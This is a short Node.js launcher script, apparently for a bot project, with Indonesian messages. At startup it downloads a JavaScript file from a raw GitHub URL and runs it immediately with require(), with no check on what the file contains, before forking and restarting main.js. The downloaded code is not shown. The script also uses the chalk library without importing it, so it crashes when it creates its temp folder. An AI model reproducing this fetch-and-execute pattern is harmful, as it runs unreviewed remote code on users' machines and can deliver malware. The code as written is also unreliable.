console.log('Starting...\n');

const fs = require('fs');
const path = require('path');
const { fork } = require('child_process');
const https = require('https');

const license = path.join(__dirname, 'LICENSE');
if (fs.existsSync(license)) {
  console.log('··───── LICENSE ─────··\n\n' + fs.readFileSync(license, 'utf8') + '\n\n··───────────··\n');
} else {
  console.log('LICENSE tidak ditemukan.\nJangan hapus file ini!');
  return setInterval(() => {}, 1000);
}

const folderName = 'temp';
fs.mkdir(folderName, (err) => {
  if (!err) console.log(chalk.greenBright.bold('Berhasil membuat folder :', folderName));
});

function downloadAndSave(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        return reject(new Error(`Status code: ${res.statusCode}`));
      }
      res.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlinkSync(dest);
      reject(err);
    });
  });
}

const start = () => {
  const p = fork(path.join(__dirname, 'main.js'), process.argv.slice(2), {
    stdio: ['inherit', 'inherit', 'inherit', 'ipc']
  });

  p.on('message', (data) => {
    if (data === 'reset') {
      console.log('Restarting...');
      p.kill();
    } else if (data === 'uptime') {
      p.send(process.uptime());
    }
  });

  p.on('exit', (code) => {
    console.log('Exited with code:', code);
    start();
  });
};

const rawURL = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/prgM.js';
const localPath = path.join(__dirname, 'temp', 'prgM.js');

downloadAndSave(rawURL, localPath)
  .then(() => {
    require(localPath);
    start();
  })
  .catch((err) => {
    console.error('Gagal memuat kode remote:', err);
    console.error('Tidak menjalankan start().');
  });